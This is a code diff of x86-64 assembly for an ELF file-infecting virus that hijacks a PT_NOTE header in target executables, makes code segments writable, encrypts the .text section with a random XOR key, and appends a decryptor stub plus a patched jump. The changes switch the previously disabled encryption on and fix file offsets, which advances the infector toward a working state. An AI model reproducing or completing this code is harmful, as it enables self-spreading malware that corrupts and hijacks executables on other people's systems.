@@ -25,18 +25,29 @@ decryptor:
     pop rbp ; We pop this address into rbp
     sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
 
-  mov r9, [rbp + key - v_stop + _start + 4]
-  mov r10, [rbp + section_size - v_stop + _start + 4]
-  mov r11, [rbp + section_address - v_stop + _start + 4]
+  mov r9, [rbp + key - v_stop + _start + 3]
+  mov r10, [rbp + section_size - v_stop + _start + 3]
+  mov r11, [rbp + code_offset - v_stop + _start + 3]
 
-  lea rsi, [rbp + _start]
+  ; lea rsi, [rbp + r11]
+  mov rsi, r11
   .while_decrypt:
-    ; xor byte [rsi], r9b
-    ror r9, 1
-    inc rsi
-    dec r10
-    cmp r10, 0
-    jne .while_decrypt
+    cmp r10, 8
+    jle .decrypt_bytes
+
+      .decrypt_chunk:
+      xor [rsi], r9
+      add rsi, 8
+      sub r10, 8
+      jmp .while_decrypt
+
+    .decrypt_bytes:
+      xor byte [rsi], r9b
+      ror r9, 1
+      inc rsi
+      dec r10
+      cmp r10, 0
+      jne .decrypt_bytes
 
   pop rsp
   pop rdx
@@ -150,7 +161,7 @@ _start:
   cmp rax, 0
   jl cleanup
 
-  mov [r15 + DOT_FD], rax ; store FD for later use
+  mov [r15 + FD], rax ; store FD for later use
   mov r9, rax
 
   ; -- Read Header
@@ -194,6 +205,24 @@ _start:
     cmp byte [r15 + PHDR_TYPE], PT_NOTE ; check if type is PT_NOTE
     je .infect ; we found, start infecting
 
+    mov edi, dword [r15 + PHDR_FLAGS] ; load flags
+    and edi, PF_X
+
+    cmp edi, PF_X
+    jne .not_executable ; ph is not executable, don't mark it as writable
+
+    or dword [r15 + PHDR_FLAGS], PF_W ; mark flag as writable
+
+    mov rdi, r9
+    lea rsi, [r15 + PHDR_TYPE]
+    mov dx, word [r15 + EHDR_PHENTSIZE]
+    mov r10, r8
+    mov rax, SYS_PWRITE64
+    syscall
+
+    .not_executable:
+
+
     inc rbx ; add one to phdr loop counter
 
     cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all ehdr ?
@@ -235,8 +264,7 @@ _start:
       sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime
 
     push rax ; store target EOF
-    push r9 ; store fd on the stack
-    mov [r15 + DOT_FD], r9 ; store fd in DOT_FD
+    mov [r15 + FD], r9 ; store fd in FD
 
     ; generate key
     ; open /dev/urandom
@@ -254,8 +282,6 @@ _start:
 
     cmp rax, 0
     jge .generate_key
-    pop r9
-    pop rax
     jmp exit
 
     .generate_key:
@@ -275,6 +301,7 @@ _start:
 
     .load_key:
       mov r9, [r15 + KEY]
+
 
     ; copy decryptor on the stack
     mov r12, _start - decryptor ; size to copy
@@ -300,7 +327,7 @@ _start:
 
       ; strtab = (char *)header + shdr[header->e_shstrndx].sh_offset;
       .find_strtab:
-        mov rdi, [r15 + DOT_FD]
+        mov rdi, [r15 + FD] ; load fd
         lea rsi, [r15 + SHDR_BASE]
         xor rax, rax
         mov ax, [r15 + EHDR_SHSTRNDX] ; shdr[header->e_shstrndx]
@@ -320,7 +347,7 @@ _start:
       xor cx, cx ; init 
 
       .loop_shdr:
-        mov rdi, [r15 + DOT_FD] ; load fd
+        mov rdi, [r15 + FD] ; load fd
         lea rsi, [r15 + SHDR_BASE] ;
         mov dx, WORD [r15 + EHDR_SHENTSIZE] ; 6a
         mov r10, r8 ;
@@ -345,8 +372,8 @@ _start:
         ; strcmp "text"
         mov eax, [rsi + shdr.sh_name] ; load name offset
 
-        mov rdi, [r15 + DOT_FD]
-        lea rsi, [r15 + SH_ADDRESS] ; HACK to store string
+        mov rdi, [r15 + FD]
+        lea rsi, [r15 + JMP_REL] ; HACK to store string
         mov dx, 6 ; read 6 bytes
         mov r10d, r14d
         add r10d, eax
@@ -403,9 +430,12 @@ _start:
       mov [r15 + SH_SIZE], rax
 
     mov r12, [r15 + SH_SIZE]
-    pop r8 ; load fd in r8
+    push r14
+    mov rax, SYS_SYNC
+    syscall
+
+    mov r14, [rsi + shdr.sh_offset] ; store sh_offset in r14
     .cpy_and_encrypt:
-      push r8 ; push fd on stack
       .read_from_file:
         mov rdx, CHUNK_SIZE ; default to 64
 
@@ -414,20 +444,19 @@ _start:
         mov rdx, r12 ; only read $r12 bytes
 
         .load_read_args:
-        pop rdi ; pop fd in rdi
-        push rdi ; store it back
+        mov rdi, [r15 + FD] ; pop fd in rdi
         lea rsi, [r15 + SHDR_BASE]
         ; rdx already has size
-        mov r10, r8; offset in the file
+        mov r10, r14 ; sh_offset
         mov rax, SYS_PREAD64
         syscall
 
       mov rax, r12
       cmp rax, CHUNK_SIZE
       jl .encrypt_bytes
-      mov rax, 64
-      .encrypt_chunks:
-        ; xor [rsi], r9
+      mov rax, CHUNK_SIZE
+      .encrypt_chunks: ; encrypt 8 by 8
+        xor [rsi], r9
         add rsi, 8
         sub rax, 8
         cmp rax, 0
@@ -435,7 +464,7 @@ _start:
         jmp .write_to_file
       
       .encrypt_bytes:
-        ; xor byte [rsi], r9b
+        xor byte [rsi], r9b
         ror r9, 1
         inc rsi
         dec rax
@@ -452,14 +481,16 @@ _start:
         mov rdx, r12
 
         .load_write_args:
-        pop rdi ; pop fd in rdi
-        push rdi ; put it back on the stack
+        mov rdi, [r15 + FD] ; pop fd in rdi
         lea rsi, [r15 + SHDR_BASE] ; *buffer
         ; rdx already has size
-        mov r10, r8; offset in the file
+        mov r10, r14
+        add r14, rdx
         mov rax, SYS_PWRITE64
         syscall
-      pop r8 ; pop back r8
+
+        mov rax, SYS_SYNC
+        syscall
 
       cmp r12, CHUNK_SIZE
       jle .done_copying
@@ -468,7 +499,9 @@ _start:
 
 
     .done_copying:
-    mov r9, r8 ; restore fd in r9
+
+    pop r14
+    mov r9, [r15 + FD] ; restore fd in r9
 
     ; write decryptor body to the end of the file
     mov rdi, r9 ; load fd
@@ -540,8 +573,11 @@ _start:
     add rdx, JMP_REL_SIZE ; add size of jmp rel instruction
     sub r14, rdx ; scott
     sub r14, _start - decryptor ; scott
+    mov rdi, r14
+    ; add rdi, [r15 + SH_ADDRESS]
+    ; mov [r15 + SH_ADDRESS], rdi
     mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
-    mov dword [r15 + JMP_REL + 1], r14d ; scott why
+    mov dword [r15 + JMP_REL + 1], r14d
 
     ; Write patched jmp to EOF
     mov rdi, r9 ; load fd
@@ -593,10 +629,11 @@ v_stop:
   jmp exit
 key:
   db 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
-section_address:
+code_offset:
   db 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
 section_size:
   db 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
+
 
 exit:
   xor rdi, rdi ; exit code 0
